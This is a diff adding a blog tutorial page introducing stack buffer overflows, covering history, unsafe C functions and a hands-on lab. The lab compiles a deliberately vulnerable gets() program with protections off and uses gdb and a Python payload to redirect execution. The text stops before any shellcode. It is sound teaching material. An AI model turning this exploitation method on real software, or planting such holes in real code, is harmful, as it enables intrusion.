@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buffer Overflow</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/monokai.css">
+    <link rel="stylesheet" href="/articles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="hero">
+        <div class="hero-content">
+            <img src="/img/articles/logo5.png" alt="index-logo" class="index-logo">
+            <h1>Buffer Overflow</h1>
+            <p>Introduction to Buffer Overflow</p>
+            <a href="/articles.html" class="mainbtn" class="mainbtn">More articles</a>
+        </div>
+    </section>
+    <section class="article-content">
+        <div class="container">
+            <div class="article-content-main">
+                <h2>Introduction</h2><br/>
+<p>What is a Buffer Overflow vulnerability? How can we achieve code execution by exploiting a Buffer Overflow? Today, we'll delve into various aspects related to Buffer Overflow vulnerabilities.</p><br/>
+<p>This article will be divided into two sections: theoretical and practical. Firstly, we'll discuss Buffer Overflow basics, covering what a Buffer Overflow vulnerability is, how it can arise, and more. Then, we'll delve into learning how to exploit common buffer overflow vulnerabilities using Shellcode, among other techniques.</p><br/>
+<p>Before diving into this article, I recommend reading my <a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">Binary Exploitation Basics</a> article, as we'll be discussing concepts explained there.</p><br/>
+<h2>What is a Buffer Overflow?</h2><br/>
+<p>A buffer overflow vulnerability occurs when a program or process attempts to store more data in a buffer (temporary storage area) than it was designed to handle. Imagine you have a glass of water, and it has a limited capacity, let's say it can hold up to 10 ounces of water. Now, let's pretend you have a pitcher of water and you want to pour it into the glass. If you pour just the right amount of water, say 8 ounces, everything is fine, and the glass holds the water without any spillage. However, if you try to pour more than the glass can hold, say 12 ounces, the excess water overflows, spilling onto the table.</p><br/>
+<p><img alt="" src="img/1.png"/></p><br/>
+<p>Similarly, in computer programming, if a program receives more data than it expects and doesn't have sufficient safeguards in place, this extra data can overflow beyond the allocated memory space for the buffer. As a result, it can overwrite adjacent memory locations, leading to unexpected behavior and potentially exploitable security vulnerabilities.</p><br/>
+<p>In essence, a buffer overflow vulnerability arises when a program fails to properly validate the size of input data it receives, allowing an attacker to send more data than the program can handle, leading to memory corruption and potential security breaches. This can be exploited by attackers to gain unauthorized access, execute malicious code, or disrupt the normal operation of the program or system.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span> <span class="p">(</span><span class="n">no</span> <span class="n">more</span> <span class="n">than</span> <span class="mi">20</span> <span class="n">characters</span><span class="p">):</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<h2>History</h2><br/>
+<p>Buffer overflow vulnerabilities were first identified in the 1970s, but they gained widespread attention in the 1980s and 1990s as hackers began to exploit them to gain unauthorized access to systems.</p><br/>
+<p>One of the earliest and most notorious examples of a buffer overflow exploit was the Morris Worm in 1988. It exploited vulnerabilities in the Unix sendmail, finger, and rsh/rexec utilities to spread rapidly across the internet, causing widespread disruption.</p><br/>
+<p>In 1995, Thomas Lopatic independently rediscovered the buffer overflow vulnerability and shared his findings on the Bugtraq security mailing list. A year later, in 1996, Elias Levy (also known as Aleph One) published a paper titled "Smashing the Stack for Fun and Profit" in Phrack magazine. This paper provided a step-by-step introduction to exploiting stack-based buffer overflow vulnerabilities.</p><br/>
+<p>In response to the growing threat posed by buffer overflow vulnerabilities, researchers and software developers began to develop mitigations such as stack canaries, address space layout randomization (ASLR), and non-executable stack protections.</p><br/>
+<p>Despite the development of mitigations, buffer overflow vulnerabilities continue to be exploited by attackers. Notable examples include the Code Red and Slammer worms in the early 2000s, which targeted vulnerabilities in Microsoft IIS and SQL Server, respectively.</p><br/>
+<p>In 2003, buffer overflow vulnerabilities in licensed Xbox games were exploited to enable the execution of unlicensed software, including homebrew games, on the console without requiring hardware modifications, such as modchips. A similar approach was used in the PS2 Independence Exploit to achieve the same result for the PlayStation 2. Additionally, the Twilight hack utilized a buffer overflow in The Legend of Zelda: Twilight Princess to achieve a similar outcome on the Wii console.</p><br/>
+<p>Research into buffer overflow vulnerabilities and mitigations remains active, with new techniques and defenses continually being developed to address this persistent threat.</p><br/>
+<h2>How do Buffer Overflow Vulnerabilities arise?</h2><br/>
+<p>Buffer overflow vulnerabilities arise due to a combination of factors related to how programs handle memory allocation and data input. </p><br/>
+<p>Commonly, buffer overflow vulnerabilities occur for the following reasons:</p><br/>
+<p><strong>Insufficient Input Validation:</strong> Programs often expect input data from users or external sources. If they fail to properly validate the size and format of this input, it can lead to buffer overflow vulnerabilities. Without adequate checks, attackers can provide maliciously crafted input that exceeds the buffer's capacity, triggering an overflow.</p><br/>
+<p><strong>Fixed-size Buffers:</strong> Many programming languages, especially older ones like C and C++, use fixed-size buffers to store data. If the input data exceeds the allocated size of these buffers, it can overwrite adjacent memory locations, leading to buffer overflows.</p><br/>
+<p><strong>Unsafe String Handling Functions:</strong> Certain string manipulation functions (e.g., <code>strcpy</code>, <code>strcat</code>) do not perform bounds checking. If used improperly, these functions can easily lead to buffer overflows if the size of the input data is not properly validated.</p><br/>
+<p><strong>Pointer Arithmetic Errors:</strong> In languages like C and C++, manual memory management and pointer arithmetic can introduce vulnerabilities if not handled carefully. Improper manipulation of pointers can result in writing data outside the intended memory boundaries of a buffer.</p><br/>
+<h2>Unsafe C Functions</h2><br/>
+<p>C and C++ programs are susceptible vulnerable to buffer overflows due to manual memory management, lack of bounds checking, pointer arithmetic, and weak type checking. In contrast, languages like Java, C#, and Python are less susceptible because they use automatic memory management, include built-in bounds checking, and enforce strong typing.</p><br/>
+<p>Common unsafe C functions:</p><br/>
+<p><strong>strcpy()</strong>: This function is used to copy a string from one location to another. However, it does not check the length of the source string, leading to buffer overflows if the destination buffer is not large enough to accommodate the entire string.</p><br/>
+<p>In the BUGS section, there is an explanation of this:</p><br/>
+<div class="highlight"><pre><span></span>If  the  destination  string  of  a  strcpy() is not large enough, then anything might happen. Overflowing fixed-length string 
+buffers is a favorite cracker technique for taking complete control of the machine.  Any time a program reads or copies  data 
+into a buffer, the program first needs to check that there's enough space.  This may be unnecessary if you can show that 
+overflow is impossible, but be careful: programs can get changed over time, in ways that may make the  im‐possible possible.
+</pre></div>
+<p><strong>gets():</strong> This function reads a line of input from stdin and stores it in a buffer. However, it does not perform any bounds checking, allowing attackers to overflow the buffer with malicious input.</p><br/>
+<p>In the BUGS section, there is also an explanation of this:</p><br/>
+<div class="highlight"><pre><span></span>Never  use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,
+and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has 
+been used to break computer security. Use fgets() instead.
+</pre></div>
+<p>The compiler warns you when using these functions in a program:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span>
+<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">vulnFunction</span><span class="err">’</span><span class="p">:</span>
+<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">gets</span><span class="err">’</span><span class="p">;</span> <span class="n">did</span> <span class="n">you</span> <span class="n">mean</span> <span class="err">‘</span><span class="n">fgets</span><span class="err">’?</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+   <span class="mi">10</span> <span class="o">|</span>   <span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+      <span class="o">|</span>   <span class="o">^~~~</span>
+      <span class="o">|</span>   <span class="n">fgets</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ld</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cczFBopT</span><span class="o">.</span><span class="n">o</span><span class="p">:</span> <span class="ow">in</span> <span class="n">function</span> <span class="err">`</span><span class="n">vulnFunction</span><span class="s1">':</span>
+<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:(</span><span class="o">.</span><span class="n">text</span><span class="o">+</span><span class="mh">0x3c</span><span class="p">):</span> <span class="n">warning</span><span class="p">:</span> <span class="n">the</span> <span class="err">`</span><span class="n">gets</span><span class="s1">' function is dangerous and should not be used.</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Even functions that are not directly vulnerable could lead to buffer overflow due to improper usage. For instance, the <code>fgets()</code> function is commonly used to read a line of input from the standard input (stdin) and store it in a buffer. Unlike the vulnerable functions we mentioned earlier (e.g., <code>gets()</code>), <code>fgets()</code> allows you to specify the maximum number of characters to read, which helps mitigate buffer overflow vulnerabilities.</p><br/>
+<p>For example, if you use <code>fgets(buffer, sizeof(buffer), stdin)</code>, where <code>buffer</code> is the destination buffer and <code>sizeof(buffer)</code> specifies the maximum number of characters to read, you can ensure that the input does not exceed the size of the buffer, thus preventing buffer overflows.</p><br/>
+<p>However, problems can arise if the specified length exceeds the size of the destination variable. For instance, consider the following code snippet:</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span><span class="w"></span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+</pre></div>
+<p>In this example, we intended to read up to 20 characters from stdin into the <code>buffer</code> array, which has a capacity of only 10 characters. This results in a buffer overflow because <code>fgets()</code> reads more characters than the buffer can hold, leading to memory corruption.</p><br/>
+<p>The same issue may occur when using <code>strncpy()</code>. It functions similarly to <code>strcpy()</code>, but it allows you to specify the maximum number of characters to copy. Therefore, entering a value greater than the capacity of the destination variable can lead to a buffer overflow.</p><br/>
+<h2>How do attackers exploit Buffer Overflow Vulnerabilities?</h2><br/>
+<p>Attackers exploit buffer overflow vulnerabilities by sending specially crafted input to a vulnerable program, causing it to store more data than it can handle. This overflow corrupts adjacent memory, allowing attackers to hijack the program's control flow. By strategically overwriting memory addresses, they can redirect execution to execute their own malicious code, typically shellcode. This code grants attackers unauthorized access or control over the system, enabling them to execute arbitrary commands, steal data, or escalate privileges.</p><br/>
+<p>In stack-based buffer overflows, the attacker aims to overwrite the return address to control the instruction pointer and consequently alter the program flow. If you've read my article on <a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">Binary Exploitation Basics</a>, you may already know that when a function is called, the memory address of the next instruction after the <code>call</code> instruction is pushed onto the stack. This allows the program to know where to return.</p><br/>
+<p>The attacker <strong>exploits this value</strong> on the stack by <strong>overwriting</strong> it with a <strong>malicious memory address</strong>. Consequently, when <strong>the function returns</strong>, the program flow is <strong>redirected to an unexpected</strong> function or program section.</p><br/>
+<p>Let's visualize this concept with a graphic:</p><br/>
+<p><img alt="" src="img/2.png"/></p><br/>
+<p>This is the stack. In this image, we can highlight the user input, the saved <code>EBP</code> value (saved base pointer), and the saved <code>EIP</code> value (the return address). In the user input, there is a string with the value <code>elswix</code>.</p><br/>
+<p>When a buffer overflow occurs, the stack may look like this:</p><br/>
+<p><img alt="" src="img/3.png"/></p><br/>
+<p>As you can see, the saved EBP and EIP values were overwritten. Therefore, when the function returns, the <code>ret</code> instruction will attempt to pop the <strong>saved EIP (return address)</strong> from the stack into the EIP register. However, since it has been overwritten with the string <code>AAAA</code>, the program will crash. Remember that the <code>ret</code> instruction is responsible for transferring control back to the calling function by popping the return address from the stack into the EIP register.</p><br/>
+<p>When the attacker observes that the program has crashed due to a buffer overflow, they can proceed to analyze the crash to determine the offset needed to overwrite the return address.</p><br/>
+<p>The offset refers to the distance between the beginning of the buffer and the location of the return address on the stack. By determining this offset, the attacker can precisely control where their malicious payload, typically shellcode, will be placed in memory.</p><br/>
+<p>To find the offset, the attacker often employs techniques such as sending input strings of varying lengths and observing how the program behaves. When the input length exceeds the buffer size, it overflows and starts corrupting adjacent memory locations, eventually overwriting the return address. By identifying the point at which the return address is overwritten and comparing it to the length of the input string, the attacker can calculate the offset.</p><br/>
+<p><img alt="" src="img/4.png"/></p><br/>
+<p>Once the attacker has found the offset, they take control of the return pointer, thereby controlling the program flow by placing memory addresses to redirect the program to malicious instructions.</p><br/>
+<p><img alt="" src="img/8.png"/></p><br/>
+<h2>Exploitation</h2><br/>
+<p>Let's start with Buffer Overflow exploitation. In this case, we'll exploit a stack-based buffer overflow, as it's the simplest and most common scenario. Firstly, we'll exploit a simple program to redirect the program flow to another function. This function is never called, so it's inaccessible without exploiting the buffer overflow vulnerability.</p><br/>
+<p><strong>C Program:</strong></p><br/>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">targetFunction</span><span class="p">(){</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Congratulations, you've successfully exploited your first buffer overflow to redirect program flow!"</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+
+<span class="p">}</span><span class="w"></span>
+
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">vulnFunction</span><span class="p">(){</span><span class="w"></span>
+
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please, enter your username: "</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %s"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>
+<span class="w">  </span><span class="n">vulnFunction</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>As you can see, this program is vulnerable to buffer overflow due to the use of the <code>gets()</code> function. To solve this challenge, we need to redirect the program execution flow to the <code>targetFunction</code>.</p><br/>
+<p>To compile this program for 32-bit architecture, we'll use <code>gcc</code> with the <code>-m32</code> parameter. Additionally, we'll use the <code>-fno-stack-protector</code> flag to disable the <a href="https://elswix.github.io/articles/4/binary-protections.html">Stack Canary</a> protection and the <code>-no-pie</code> parameter to disable the <a href="https://elswix.github.io/articles/4/binary-protections.html">PIE</a> protection:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
+</pre></div>
+<p>Don't worry about the warnings; they're notifying you of the danger of using <code>gets()</code>.</p><br/>
+<p>We're using 32-bit architecture for simplicity. In upcoming articles, we'll explore how to exploit programs running on 64-bit architecture.</p><br/>
+<p>When running the program, it prompts for a username and then prints the entered string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">/</span><span class="n">program</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">elswix</span>
+<span class="n">Hello</span><span class="p">,</span> <span class="n">elswix</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Let's see what happens if we enter a large number of characters to trigger a buffer overflow:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>As you can see, it displayed the <code>zsh: segmentation fault (core dumped)</code> message. This indicates that the program flow was redirected to an inaccessible memory address, confirming that we've successfully overwritten the return address.</p><br/>
+<p>Let's analyze this binary with <code>gdb</code> (GNU Debugger) to perform a thorough examination of the program's behavior:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">program</span>
+<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="err">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
+<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.00</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">program...</span>
+<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">program</span><span class="p">)</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Let's execute the program and input a long string to trigger a buffer overflow:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">program</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</pre></div>
+<p><img alt="" src="img/5.png"/></p><br/>
+<p>As you can see, the Instruction Pointer (EIP) has been successfully overwritten. </p><br/>
+<p>Once we've confirmed that we can trigger a buffer overflow, the next step is to find the offset needed to overwrite the return address on the stack. We can achieve this by creating a string with a repeating pattern. When we enter this string and the program crashes, we can examine the memory to determine where the return address was overwritten.</p><br/>
+<p>If you use the <a href="https://github.com/hugsy/gef">gef</a> extension of GDB, you can use the <code>pattern create</code> command to generate a pattern string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">100</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">100</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef1'</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Now, let's copy that string and enter it as the username:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">r</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x61616169</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p><img alt="" src="img/6.png"/></p><br/>
+<p>As you can see, the instruction pointer was overwritten with the string <code>iaaa</code>. To find the return address offset, we can use the <code>pattern offset</code> command and specify the <code>EIP</code> register:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="err">$</span><span class="n">eip</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="s1">'69616161'</span><span class="o">/</span><span class="s1">'61616169'</span> <span class="k">with</span> <span class="n">period</span><span class="o">=</span><span class="mi">4</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">32</span> <span class="p">(</span><span class="n">little</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span> <span class="n">likely</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>This indicates that we need to write 32 characters before overwriting the instruction pointer.</p><br/>
+<p>Let's put this into practice by creating our custom string. We'll print 32 "A" characters followed by 4 "B" characters. If everything works as expected, the EIP should hold the string <code>BBBB</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "B"*4)'</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span>
+</pre></div>
+<p>Let's execute the program again:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">r</span>
+<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x42424242</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>As observed, it attempted to return to the address <code>0x42424242</code>, which is the hexadecimal representation of the string <code>BBBB</code>:</p><br/>
+<p><img alt="" src="img/7.png"/></p><br/>
+<p>We need to redirect program execution to the <code>targetFunction</code> to solve this challenge. Since we disabled the PIE protection when compiling the program, the addresses within the binary won't change every time you execute the program. So, we simply need to find the address of the <code>targetFunction</code> and place it in the return address.</p><br/>
+<p>To obtain the <code>targetFunction</code> address, we can use gdb:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span> <span class="n">targetFunction</span> 
+<span class="mh">0x8049196</span> <span class="o">&lt;</span><span class="n">targetFunction</span><span class="o">&gt;</span><span class="p">:</span>   <span class="mh">0x53e58955</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>The <code>targetFunction</code> is located at address <code>0x8049196</code>. As we've observed, we need to enter 32 characters before modifying the return address. Therefore, after those 32 characters, we need to place the address of the <code>targetFunction</code>.</p><br/>
+<p>Little-endian is a byte-ordering format. In little-endian format, the least significant byte (LSB) is stored first, followed by the more significant bytes in increasing order of significance. This means that the byte with the lowest memory address contains the least significant bits of the data, while the byte with the highest memory address contains the most significant bits.</p><br/>
+<p>The address <code>0x8049196</code> will be represented in little-endian format as <code>\x96\x91\x04\x08</code>.</p><br/>
+<p>We'll use Python to craft our malicious input string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"A"*32 + b"</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="n">�</span>
+</pre></div>
+<p>You may be wondering why I'm using <code>sys.stdout.buffer.write</code> instead of <code>print</code>. The main reason is that we're dealing with bytes, and the <code>print</code> function will print the bytes string as a normal string enclosed in <code>b''</code>, without displaying the actual byte values:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print(b"A"*32 + b"</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span>
+<span class="n">b</span><span class="n">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="n">\x96\x91\x04\x08</span><span class="n">'</span>
+</pre></div>
+<p>Of course, this won't work because the string <code>\x96\x91\x04\x08</code> is not being interpreted as hexadecimal bytes. Instead of writing those 4 bytes to the return address, we're writing the string "<code>\x96</code>".</p><br/>
+<p>Additionally, the <code>print</code> function adds a line feed (<code>\n</code>) character after the string, which may cause problems.</p><br/>
+<p>This issue with the <code>print</code> function only occurs in Python 3. In Python 2, there are no problems with printing hexadecimal and non-printable characters:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="n">��</span>
+</pre></div>
+<p>Although it also adds a line feed character at the end of the string, it doesn't affect the outcome depending on the context.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'print("A"*32 + "</span><span class="s1">\x96\x91\x04\x08</span><span class="s1">")'</span> <span class="o">|</span> <span class="n">xxd</span>
+<span class="mi">00000000</span><span class="p">:</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
+<span class="mi">00000010</span><span class="p">:</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span> <span class="mi">4141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
+<span class="mi">00000020</span><span class="p">:</span> <span class="mi">9691</span> <span class="mi">0408</span> <span class="mi">0</span><span class="n">a</span>                             <span class="o">.....</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Anyway, to avoid dealing with these problems, we can simply use <code>sys.stdout.buffer.write</code>, which is perfect for these cases.</p><br/>
